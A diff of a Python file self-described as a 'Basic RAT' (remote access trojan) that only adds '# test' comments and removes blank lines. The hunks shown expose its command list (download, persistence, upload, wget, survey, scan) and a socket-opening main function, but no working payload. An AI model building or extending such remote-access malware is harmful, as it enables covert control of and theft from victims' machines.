@@ -1,7 +1,6 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-
 '''
 ______           _     ______  ___ _____   _            _
 | ___ \         (_)    | ___ \/ _ \_   _| | |          | |
@@ -15,7 +14,9 @@ ______           _     ______  ___ _____   _            _
 
 """ Basic RAT """
 '''   test   '''
-
+## test # test
+# test # test
+## test
 #---------------------------------------------------------- [Lib] -----------------------------------------------------------#
 
 import argparse
@@ -60,7 +61,6 @@ ______           _     ______  ___ _____   _            _
 
 '''
 
-
 COMMANDS = [
             'download', 'help', 'persistence', 'quit', 'rekey',
             'run', 'scan', 'survey', 'unzip', 'upload', 'wget'
@@ -85,14 +85,15 @@ def EmptyFunc():
     """ comment """
 
 class EmptyClass:
-
-    """dd"""
+    """ comment """
 
 def main():
-    parser  = get_parser()
-    args    = vars(parser.parse_args())
-    port    = args['port']
+    parser  = get_parser() ## test
+    args    = vars(parser.parse_args()) # test # test
+    port    = args['port'] ## test # test
 
+    print("# test") # test
+    
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     try:
